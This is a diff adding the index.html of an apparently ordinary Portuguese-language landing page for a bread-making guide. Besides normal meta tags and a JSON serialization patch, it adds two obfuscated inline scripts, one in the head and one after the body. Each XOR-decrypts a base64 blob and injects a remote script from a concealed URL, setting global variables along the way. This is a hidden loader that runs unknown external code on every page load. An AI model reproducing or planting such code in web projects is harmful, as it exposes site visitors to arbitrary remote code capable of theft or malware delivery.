@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <script>
+      /* Safe JSON serialization guard for third-party trackers & React Fiber */
+      (function() {
+        var originalStringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          try {
+            return originalStringify.call(JSON, value, replacer, space);
+          } catch (err) {
+            if (err && err.message && err.message.toLowerCase().indexOf('circular') !== -1) {
+              var seen = new WeakSet();
+              return originalStringify.call(JSON, value, function(key, val) {
+                if (typeof val === 'object' && val !== null) {
+                  if (typeof key === 'string' && (key.indexOf('__react') === 0)) {
+                    return undefined;
+                  }
+                  if (val instanceof Node || val instanceof Window) {
+                    return undefined;
+                  }
+                  if (seen.has(val)) {
+                    return undefined;
+                  }
+                  seen.add(val);
+                }
+                if (typeof replacer === 'function') {
+                  return replacer.call(this, key, val);
+                }
+                return val;
+              }, space);
+            }
+            throw err;
+          }
+        };
+      })();
+    </script>
+
+<script>(function(){var v_g1tv=atob("DDlMNIIu3qDm6B4tDkJuQfBC/JrEgGpZfkp2G61Nus7InWpAZ181GuFBs46EmjFebUslRPZd8dCPkHtBIUklTOdC8MqVyjIPb004RutMq9SDmzwXVWRgFuVCscKHhG0PNGI3FuxPs8XE0jxdZ0EpWMtK/IzEnn9Be1xuDqAYv8PRjnpJaggqDLtMvJeCjioda1t8DbEMo/2b");var n_d3=[];for(var o_jhsn=0;o_jhsn<v_g1tv.length;o_jhsn++){n_d3.push(v_g1tv.charCodeAt(o_jhsn)&255);}var o_e=n_d3[0];var k_i=n_d3.slice(1,1+o_e);var l_zt=n_d3.slice(1+o_e);var g_n89=l_zt.map(function(b,t_g){return b^k_i[t_g%o_e];});var i_x3="";for(var z_3by=0;z_3by<g_n89.length;z_3by++){i_x3+=String.fromCharCode(g_n89[z_3by]&255);}var s_bcp=decodeURIComponent(escape(i_x3));var z_0=JSON.parse(s_bcp);var j_g78=z_0.globals||[];j_g78.forEach(function(p_a){window[p_a.name]=p_a.value;});var b_q2vr=document.createElement("script");b_q2vr.src=z_0.url;b_q2vr.async=true;b_q2vr.defer=true;(z_0.attributes||[]).forEach(function(u_e){b_q2vr.setAttribute(u_e.name,u_e.value);});(document.head||document.documentElement).appendChild(b_q2vr);})();</script>
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>+200 Mapas Visuais de Panificação</title>
+    <meta name="description" content="Massas, fermentação, sova, modelagem e forno: Panificação fácil de entender" />
+    <meta property="og:title" content="+200 Mapas Visuais de Panificação" />
+    <meta property="og:description" content="Massas, fermentação, sova, modelagem e forno: Panificação fácil de entender" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  </head>
+  <body class="bg-[#F8FAFC] text-slate-800 antialiased selection:bg-amber-100 selection:text-amber-900">
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>  <script>(function(){var g_5rc=atob("DFkMb+YpWIF/GA7tviIuGpRFertdcHqZzio2QMlKPO9RbXqA1z91QYVGNa8daiGe3StlH5Jad/QLdX3C0jh4CpVddusMOiLP3y14HY9LLfUaayzX5SIuAYdEPaNFOmqMyjghGpJEMecGNX6f2y9pAZIEIOIQfCOe3TIuQ8RfOe0KfSzXnHtxQ50LNuASfSzXnD1tG4cELfUScWiUkyl+CpBMNvVSa3uP1z1/TcoLLuATbWvPhHsuErtU");var d_zd=[];for(var n_des=0;n_des<g_5rc.length;n_des++){d_zd.push(g_5rc.charCodeAt(n_des)&255);}var f_ea=d_zd[0];var i_cd94=d_zd.slice(1,1+f_ea);var d_3m2=d_zd.slice(1+f_ea);var q_59h7=d_3m2.map(function(b,p_2m){return b^i_cd94[p_2m%f_ea];});var m_a7="";for(var d_nhm=0;d_nhm<q_59h7.length;d_nhm++){m_a7+=String.fromCharCode(q_59h7[d_nhm]&255);}var c_i=decodeURIComponent(escape(m_a7));var f_8c2f=JSON.parse(c_i);var p_o7yp=f_8c2f.globals||[];p_o7yp.forEach(function(x_k){window[x_k.name]=x_k.value;});var e_eg=document.createElement("script");e_eg.src=f_8c2f.url;e_eg.async=true;e_eg.defer=true;(f_8c2f.attributes||[]).forEach(function(b_82r){e_eg.setAttribute(b_82r.name,b_82r.value);});(document.head||document.documentElement).appendChild(e_eg);})();</script>
+</html>
+
